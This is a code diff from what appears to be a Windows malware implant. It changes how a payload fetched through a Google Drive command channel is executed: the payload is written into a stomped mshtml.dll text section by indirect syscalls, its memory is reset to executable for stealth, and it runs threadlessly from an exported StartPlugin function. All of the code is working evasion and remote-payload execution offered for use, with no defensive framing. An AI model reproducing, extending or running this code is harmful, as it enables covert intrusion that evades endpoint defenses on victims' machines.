@@ -38,20 +38,21 @@ static void InitializeApiTable() {
     g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
 }
 
-static void ExecutePayload() {
+static void ExecutePayload(PVOID pTargetAddr, SIZE_T targetSize) {
     uint8_t payload[4096];
     
     if (!GDrive_CheckForCommands((char*)payload, sizeof(payload))) return;
 
-    PVOID pExec = NULL;
-    SIZE_T size = sizeof(payload);
-    InvokeSyscall(g_ApiTable.NtAllocateVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pExec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    
-    if (pExec) {
-        InvokeSyscall(g_ApiTable.NtWriteVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, pExec, payload, size, NULL);
+    if (pTargetAddr && sizeof(payload) <= targetSize) {
+        // El área ya debería estar en PAGE_READWRITE gracias a ModuleStompRobust
+        InvokeSyscall(g_ApiTable.NtWriteVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, pTargetAddr, payload, sizeof(payload), NULL);
+        
         ULONG old;
-        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pExec, &size, PAGE_EXECUTE_READ, &old);
-        ThreadlessExecute(pExec);
+        SIZE_T size = targetSize;
+        // Restauramos permisos a PAGE_EXECUTE_READ para ser sigilosos (respaldado por archivo)
+        InvokeSyscall(g_ApiTable.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pTargetAddr, &size, PAGE_EXECUTE_READ, &old);
+        
+        ThreadlessExecute(pTargetAddr);
     }
 }
 
@@ -64,7 +65,8 @@ extern "C" __declspec(dllexport) void StartPlugin() {
 
     STOMP_CONTEXT ctx = {0};
     if (ModuleStompRobust(L"mshtml.dll", 0x1000, &ctx)) {
-        ExecutePayload();
+        PVOID pTarget = (PBYTE)ctx.BaseAddress + ctx.TextSection->VirtualAddress;
+        ExecutePayload(pTarget, ctx.RegionSize);
     }
 
     while (TRUE) {
